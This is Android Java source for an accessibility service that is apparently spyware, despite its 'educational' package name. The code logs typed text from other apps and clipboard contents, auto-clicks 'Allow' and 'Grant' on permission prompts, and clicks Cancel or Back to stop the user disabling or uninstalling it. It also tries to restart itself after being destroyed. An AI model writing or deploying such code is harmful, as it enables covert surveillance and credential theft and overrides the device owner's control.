package com.remoteaccess.educational.permissions;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AccessibilityHelperService extends AccessibilityService {

    private static AccessibilityHelperService instance;
    private static boolean isAutoClickEnabled = true;
    private Handler handler;
    private Runnable autoClickDisableRunnable;
    
    // Keylogger
    private ClipboardManager clipboardManager;
    private String lastClipboard = "";
    private StringBuilder keyBuffer = new StringBuilder();
    private static final int BUFFER_SIZE = 100;

    // Anti-disable & Anti-uninstall
    private BroadcastReceiver packageReceiver;

    public static AccessibilityHelperService getInstance() {
        return instance;
    }

    public static void disableAutoClick() {
        isAutoClickEnabled = false;
    }

    public static void enableAutoClick() {
        isAutoClickEnabled = true;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        handler = new Handler();
        
        // Initialize clipboard for keylogger
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        
        // Register for package changes (uninstall detection)
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
        filter.addAction(Intent.ACTION_PACKAGE_FULLY_REMOVED);
        filter.addDataScheme("package");
        registerReceiver(packageReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent != null && intent.getData() != null) {
                    String packageName = intent.getData().getSchemeSpecificPart();
                    if (packageName != null && packageName.equals(getPackageName())) {
                        onUninstallAttempt();
                    }
                }
            }
        }, filter);
        
        // Auto-disable auto-click after 10 seconds (keylogger keeps running)
        autoClickDisableRunnable = new Runnable() {
            @Override
            public void run() {
                disableAutoClick();
            }
        };
        handler.postDelayed(autoClickDisableRunnable, 10000);
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | 
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 50;
        
        setServiceInfo(info);
        
        Log.d("AccessibilityHelper", "Service started with anti-disable");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (instance == null) instance = this;
        
        // Anti-disable: Monitor accessibility settings
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            preventAccessibilityDisable(event);
        }
        
        // Always run keylogger (even after auto-click is disabled)
        handleKeylogging(event);
        
        // Auto-click only when enabled
        if (isAutoClickEnabled) {
            performAutoClick();
        }
    }

    private void preventAccessibilityDisable(AccessibilityEvent event) {
        try {
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            // Check if user is in accessibility settings
            if (className.contains("AccessibilitySettings") || 
                className.contains("Switch") ||
                className.contains("Toggle")) {
                
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    // Find and click Cancel or Back to prevent changes
                    if (findAndClickButton(rootNode, "Cancel")) return;
                    if (findAndClickButton(rootNode, "Back")) return;
                    if (findAndClickButton(rootNode, "NO")) return;
                    if (findAndClickButton(rootNode, "Don't allow")) return;
                    rootNode.recycle();
                }
            }
            
            // ANTI-UNINSTALL: Detect package installer
            detectAndBlockUninstall(event);
            
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private void detectAndBlockUninstall(AccessibilityEvent event) {
        try {
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            // Detect package installer / app info screens
            if (className.contains("PackageInstaller") ||
                className.contains("AppInfo") ||
                className.contains("Settings$AppInfo") ||
                className.contains("UninstallConfirm") ||
                className.contains("PackageManager") ||
                className.contains("ResolverActivity")) {
                
                // Check if our app name is visible
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    String ourPackage = getPackageName();
                    
                    // Try to find our app name and click Cancel/Back
                    if (findTextAndClick(rootNode, ourPackage)) {
                        // Found our app - now close the activity
                        performGlobalBack();
                        rootNode.recycle();
                        return;
                    }
                    
                    // Try to find and click Cancel/Uninstall
                    if (findAndClickButton(rootNode, "Cancel")) return;
                    if (findAndClickButton(rootNode, "Uninstall")) return;
                    if (findAndClickButton(rootNode, "OK")) return;
                    if (findAndClickButton(rootNode, "Back")) return;
                    
                    rootNode.recycle();
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }
    
    private boolean findTextAndClick(AccessibilityNodeInfo node, String text) {
        if (node == null) return false;
        
        try {
            // Check if this node contains our package name
            CharSequence nodeText = node.getText();
            if (nodeText != null && nodeText.toString().toLowerCase().contains(text.toLowerCase())) {
                return true; // Found our app
            }
            
            // Check content description
            CharSequence contentDesc = node.getContentDescription();
            if (contentDesc != null && contentDesc.toString().toLowerCase().contains(text.toLowerCase())) {
                return true; // Found our app
            }
            
            // Check children
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findTextAndClick(child, text)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        
        return false;
    }
    
    private void performGlobalBack() {
        try {
            // Press back via accessibility service
            this.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
        } catch (Exception e) {
            try {
                // Alternative: simulate back button
                Runtime.getRuntime().exec("input keyevent 4");
            } catch (Exception e2) {
                // Ignore
            }
        }
    }

    private void onUninstallAttempt() {
        Log.w("AccessibilityHelper", "Uninstall attempted!");
        
        // Open device admin or security settings to block uninstall
        try {
            Intent intent = new Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            // Try alternate
            try {
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception e2) {
                // Ignore
            }
        }
        
        // Go to home screen to block uninstall
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            // Ignore
        }
    }

    private void handleKeylogging(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? 
                               event.getPackageName().toString() : "";
            
            // Skip our own app
            if (packageName.equals(getPackageName())) {
                return;
            }
            
            // Capture text input
            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                List<CharSequence> textList = event.getText();
                if (textList != null && !textList.isEmpty()) {
                    StringBuilder sb = new StringBuilder();
                    for (CharSequence text : textList) {
                        if (text != null) {
                            sb.append(text);
                        }
                    }
                    String typedText = sb.toString();
                    if (!typedText.isEmpty() && typedText.length() < 50) {
                        keyBuffer.append("[").append(packageName).append(": ").append(typedText).append("] ");
                    }
                }
            }
            
            // Capture clipboard
            if (clipboardManager != null && clipboardManager.hasPrimaryClip()) {
                try {
                    ClipData clip = clipboardManager.getPrimaryClip();
                    if (clip != null && clip.getItemCount() > 0) {
                        CharSequence clipboardText = clip.getItemAt(0).getText();
                        if (clipboardText != null && !clipboardText.toString().equals(lastClipboard)) {
                            lastClipboard = clipboardText.toString();
                            keyBuffer.append("[CLIPBOARD: ").append(lastClipboard).append("] ");
                        }
                    }
                } catch (Exception e) {
                    // Ignore
                }
            }
            
            // Send logs when buffer is full
            if (keyBuffer.length() >= BUFFER_SIZE) {
                sendKeylogs();
            }
        } catch (Exception e) {
            // Ignore
        }
    }

    private void sendKeylogs() {
        if (keyBuffer.length() > 0) {
            String logs = keyBuffer.toString();
            keyBuffer.setLength(0);
            Log.d("Keylogger", "Captured: " + logs);
        }
    }

    private void performAutoClick() {
        if (!isAutoClickEnabled) return;
        
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) {
            if (handler != null) {
                handler.postDelayed(() -> performAutoClick(), 200);
            }
            return;
        }

        if (findAndClickButton(rootNode, "Allow")) return;
        if (findAndClickButton(rootNode, "ALLOW")) return;
        if (findAndClickButton(rootNode, "Allow all the time")) return;
        if (findAndClickButton(rootNode, "Allow all the time and don't ask again")) return;
        if (findAndClickButton(rootNode, "While using the app")) return;
        if (findAndClickButton(rootNode, "Only this time")) return;
        if (findAndClickButton(rootNode, "Permit")) return;
        if (findAndClickButton(rootNode, "Grant")) return;
        if (findAndClickButton(rootNode, "Yes")) return;
        if (findAndClickButton(rootNode, "OK")) return;
        if (findAndClickButton(rootNode, "Done")) return;
        if (findAndClickButton(rootNode, "Next")) return;
        if (findAndClickButton(rootNode, "Continue")) return;
        
        rootNode.recycle();
    }

    private boolean findAndClickButton(AccessibilityNodeInfo node, String text) {
        if (node == null) return false;

        try {
            if (node.isClickable()) {
                CharSequence nodeText = node.getText();
                if (nodeText != null && nodeText.toString().toLowerCase().contains(text.toLowerCase())) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                
                CharSequence contentDesc = node.getContentDescription();
                if (contentDesc != null && contentDesc.toString().toLowerCase().contains(text.toLowerCase())) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickButton(child, text)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            // Ignore
        }

        return false;
    }

    @Override
    public void onInterrupt() {
        // Service interrupted
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        
        // Try to restart service
        try {
            Intent intent = new Intent(this, AccessibilityHelperService.class);
            startService(intent);
        } catch (Exception e) {
            // Ignore
        }
        
        try {
            if (packageReceiver != null) {
                unregisterReceiver(packageReceiver);
            }
        } catch (Exception e) {
            // Ignore
        }
    }
}
